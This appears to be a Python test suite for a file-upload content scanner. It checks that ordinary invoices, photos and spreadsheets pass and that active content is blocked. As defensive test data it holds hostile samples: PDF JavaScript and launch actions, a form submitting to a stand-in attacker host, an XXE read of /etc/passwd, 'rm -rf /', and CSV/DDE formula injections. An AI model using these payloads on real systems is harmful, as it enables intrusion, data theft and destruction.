"""The content check: ordinary business files pass, active content is refused.

Every attack sample here is made up and harmless: the scripts only call
``app.alert``, and the "programs" are just their header bytes.
"""

import io
import unittest
import zipfile

from PIL import Image

from kaagaz.adapters.scanner import LayeredScanner
from kaagaz.scanning.content import Finding, inspect
from kaagaz.scanning.gate import CUSTOMER_MESSAGES, REJECTION_CODES, Verdict
from tests.pdf_builder import Page, Text, make_pdf
from tests.xlsx_builder import make_xlsx, sheet_xml

WINDOWS_PROGRAM = b"MZ" + b"\x90" * 62 + b"This program cannot be run in DOS mode.\r\r\n$" + b"\x00" * 64
LINUX_PROGRAM = b"\x7fELF\x02\x01\x01" + b"\x00" * 57


def pdf_with(objects: list[bytes]) -> bytes:
    """A small PDF with a correct cross-reference table, built from object bodies.

    Object 1 must be the catalog.
    """
    out = io.BytesIO()
    out.write(b"%PDF-1.7\n")
    offsets = []
    for number, body in enumerate(objects, start=1):
        offsets.append(out.tell())
        out.write(b"%d 0 obj\n" % number + body + b"\nendobj\n")
    xref = out.tell()
    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1))
    for offset in offsets:
        out.write(b"%010d 00000 n \n" % offset)
    out.write(b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref))
    return out.getvalue()


PAGES = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
PAGE = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>"


def png_bytes() -> bytes:
    buffer = io.BytesIO()
    Image.new("RGB", (40, 30), "white").save(buffer, "PNG")
    return buffer.getvalue()


def zip_bytes(members: dict[str, bytes], *, encrypted: bool = False) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, data in members.items():
            archive.writestr(name, data)
    raw = bytearray(buffer.getvalue())
    if encrypted:
        # zipfile cannot write encrypted parts, so set the "encrypted" flag bit
        # in every local and central header by hand, as a protected file has.
        for signature, flag_offset in ((b"PK", 6), (b"PK", 8)):
            start = raw.find(signature)
            while start != -1:
                raw[start + flag_offset] |= 0x1
                start = raw.find(signature, start + 4)
    return bytes(raw)


def spreadsheet() -> bytes:
    return make_xlsx(
        [("Sheet1", sheet_xml('<row r="1"><c r="A1" t="inlineStr"><is><t>Total</t></is></c></row>'))]
    )


def with_member(xlsx: bytes, name: str, data: bytes) -> bytes:
    buffer = io.BytesIO(xlsx)
    with zipfile.ZipFile(buffer, "a") as archive:
        archive.writestr(name, data)
    return buffer.getvalue()


class OrdinaryFilesPass(unittest.TestCase):
    def test_a_text_pdf(self) -> None:
        pdf = make_pdf([Page(texts=[Text(72, 700, "Invoice No: INV-1042"), Text(72, 680, "Total: Rs. 500")])])
        self.assertIsNone(inspect(pdf))

    def test_a_pdf_with_an_ordinary_web_link(self) -> None:
        link = b"<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://example.test) >> >>"
        self.assertIsNone(inspect(pdf_with([b"<< /Type /Catalog /Pages 2 0 R >>", PAGES, PAGE, link])))

    def test_a_photo(self) -> None:
        self.assertIsNone(inspect(png_bytes()))

    def test_a_spreadsheet(self) -> None:
        self.assertIsNone(inspect(spreadsheet()))

    def test_a_spreadsheet_with_a_hyperlink(self) -> None:
        rels = (
            b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
            b' Target="https://example.test" TargetMode="External"/></Relationships>'
        )
        self.assertIsNone(inspect(with_member(spreadsheet(), "xl/worksheets/_rels/sheet1.xml.rels", rels)))

    def test_a_csv_with_negative_numbers_and_a_sum(self) -> None:
        csv = b"Name,Month,Profit\nSharma Traders,Aug 2026,-1234\nTotal,,=SUM(C2:C3)\n"
        self.assertIsNone(inspect(csv))

    def test_a_csv_with_a_byte_order_mark(self) -> None:
        self.assertIsNone(inspect("\ufeffName,Amount\nA,10\n".encode()))


class PdfActiveContentIsBlocked(unittest.TestCase):
    def blocked(self, catalog_extra: bytes, *more: bytes) -> None:
        catalog = b"<< /Type /Catalog /Pages 2 0 R " + catalog_extra + b" >>"
        self.assertIs(inspect(pdf_with([catalog, PAGES, PAGE, *more])), Finding.BLOCKED)

    def test_javascript_on_open(self) -> None:
        self.blocked(b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>")

    def test_javascript_in_a_separate_object(self) -> None:
        self.blocked(b"/OpenAction 4 0 R", b"<< /S /JavaScript /JS (app.alert(1)) >>")

    def test_an_obfuscated_javascript_name(self) -> None:
        # "#61" is "a": /J#61vaScript is /JavaScript to a PDF reader.
        self.blocked(
            b"/Names << /J#61vaScript 4 0 R >>", b"<< /Names [(x) 5 0 R] >>", b"<< /S /JavaScript >>"
        )

    def test_a_launch_action(self) -> None:
        self.blocked(b"/OpenAction << /S /Launch /F (cmd.exe) >>")

    def test_an_embedded_file(self) -> None:
        self.blocked(
            b"/Names << /EmbeddedFiles 4 0 R >>", b"<< /Names [(a.exe) 5 0 R] >>", b"<< /Type /Filespec >>"
        )

    def test_a_form_that_submits_data(self) -> None:
        self.blocked(b"/OpenAction << /S /SubmitForm /F (https://evil.test) >>")

    def test_an_xfa_form(self) -> None:
        self.blocked(b"/AcroForm << /XFA 4 0 R >>", b"<< >>")

    def test_an_unreadable_pdf_is_not_called_safe(self) -> None:
        self.assertIs(inspect(b"%PDF-1.7\n" + b"\x00garbage" * 50), Finding.UNSCANNABLE)


class HiddenProgramsAndPolyglots(unittest.TestCase):
    def test_a_windows_program_inside_a_pdf(self) -> None:
        pdf = make_pdf([Page(texts=[Text(72, 700, "Invoice")])])
        self.assertIs(inspect(pdf + WINDOWS_PROGRAM), Finding.BLOCKED)

    def test_a_linux_program_inside_an_image(self) -> None:
        self.assertIs(inspect(png_bytes() + LINUX_PROGRAM), Finding.BLOCKED)

    def test_an_archive_glued_onto_a_photo(self) -> None:
        self.assertIs(inspect(png_bytes() + zip_bytes({"run.txt": b"hello"})), Finding.BLOCKED)

    def test_a_program_is_refused_whatever_its_name(self) -> None:
        # invoice.pdf.exe: the bytes, not the name, decide.
        self.assertIs(inspect(WINDOWS_PROGRAM), Finding.BLOCKED)

    def test_an_unknown_type_is_refused(self) -> None:
        self.assertIs(inspect(b"\x00\x01\x02\x03 not a document"), Finding.BLOCKED)


class OfficePackages(unittest.TestCase):
    def test_macros(self) -> None:
        self.assertIs(inspect(with_member(spreadsheet(), "xl/vbaProject.bin", b"x")), Finding.BLOCKED)

    def test_excel_4_macro_sheets(self) -> None:
        self.assertIs(
            inspect(with_member(spreadsheet(), "xl/macrosheets/sheet1.xml", b"<x/>")), Finding.BLOCKED
        )

    def test_activex_and_ole_objects(self) -> None:
        for name in ("xl/activeX/activeX1.xml", "xl/embeddings/oleObject1.bin"):
            with self.subTest(name=name):
                self.assertIs(inspect(with_member(spreadsheet(), name, b"x")), Finding.BLOCKED)

    def test_an_executable_or_archive_inside(self) -> None:
        for name in ("xl/media/run.exe", "docs/payload.js", "inner.zip", "report.xlsm"):
            with self.subTest(name=name):
                self.assertIs(inspect(with_member(spreadsheet(), name, b"x")), Finding.BLOCKED)

    def test_path_traversal(self) -> None:
        for name in ("../../evil.txt", "/etc/passwd", "C:/Windows/evil.txt", "a/../../b"):
            with self.subTest(name=name):
                self.assertIs(inspect(zip_bytes({name: b"x"})), Finding.BLOCKED)

    def test_a_remote_template(self) -> None:
        rels = (
            b'<Relationships><Relationship Id="rId9"'
            b' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
            b' Target="https://evil.test/t.dotm" TargetMode="External"/></Relationships>'
        )
        self.assertIs(
            inspect(with_member(spreadsheet(), "xl/_rels/settings.xml.rels", rels)), Finding.BLOCKED
        )

    def test_a_password_protected_part_cannot_be_checked(self) -> None:
        self.assertIs(inspect(zip_bytes({"a.xml": b"x"}, encrypted=True)), Finding.UNSCANNABLE)


class PlainText(unittest.TestCase):
    def test_markup_and_scripts_are_refused(self) -> None:
        samples = [
            "<html><body>hi</body></html>",
            "  <svg xmlns='http://www.w3.org/2000/svg'/>",
            "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x/>",
            "{\\rtf1\\ansi hello}",
            "#!/bin/sh\nrm -rf /\n",
            "@echo off\ndel *.*\n",
            "Name,Note\nA,<script>alert(1)</script>\n",
            "Name,Link\nA,javascript:alert(1)\n",
        ]
        for sample in samples:
            with self.subTest(sample=sample[:20]):
                self.assertIs(inspect(sample.encode()), Finding.BLOCKED)

    def test_formulas_that_run_commands_are_refused(self) -> None:
        samples = [
            "Name,Amount\nA,=cmd|' /C calc'!A0\n",
            "Name,Amount\nA,@SUM(1+1)*cmd|' /C calc'!A0\n",
            'Name,Amount\nA,=DDE("cmd";"/C calc";"x")\n',
            'Name,Amount\nA,=HYPERLINK("https://evil.test","click")\n',
            'Name,Amount\nA,+WEBSERVICE("https://evil.test")\n',
        ]
        for sample in samples:
            with self.subTest(sample=sample[12:40]):
                self.assertIs(inspect(sample.encode()), Finding.BLOCKED)


class RecordingScanner:
    def __init__(self) -> None:
        self.calls = 0

    def scan(self, data: bytes) -> Verdict:
        self.calls += 1
        return Verdict.CLEAN


class TheLayers(unittest.TestCase):
    def test_a_blocked_file_never_reaches_the_virus_scanner(self) -> None:
        inner = RecordingScanner()
        self.assertIs(LayeredScanner(inner).scan(WINDOWS_PROGRAM), Verdict.BLOCKED)
        self.assertEqual(inner.calls, 0)

    def test_an_uninspectable_file_is_unscannable(self) -> None:
        self.assertIs(LayeredScanner(RecordingScanner()).scan(b"%PDF-1.7\n\x00\x00"), Verdict.UNSCANNABLE)

    def test_a_clean_file_still_goes_to_the_virus_scanner(self) -> None:
        inner = RecordingScanner()
        self.assertIs(LayeredScanner(inner).scan(png_bytes()), Verdict.CLEAN)
        self.assertEqual(inner.calls, 1)

    def test_blocked_is_a_rejection_with_a_customer_message(self) -> None:
        self.assertIn("blocked_content", REJECTION_CODES)
        self.assertIn("scripts, macros", CUSTOMER_MESSAGES["blocked_content"])


if __name__ == "__main__":
    unittest.main()
